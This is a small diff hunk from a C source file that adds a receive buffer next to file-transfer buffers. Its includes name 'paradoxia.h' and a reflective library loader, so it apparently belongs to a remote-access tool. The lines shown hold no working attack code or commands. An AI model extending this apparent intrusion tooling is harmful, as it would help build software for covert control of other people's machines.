@@ -14,6 +14,9 @@ If you decide to copy, Don't forget to give me credit.
 #include "paradoxia.h"
 #include "LoadLibraryR.h"
 
+
+char recvbuf[BUFFER];
+
 int fsize = 0;
 char* fileinfo[3];
 char temp[BUFFER]; // Temporary buffer to receive file information
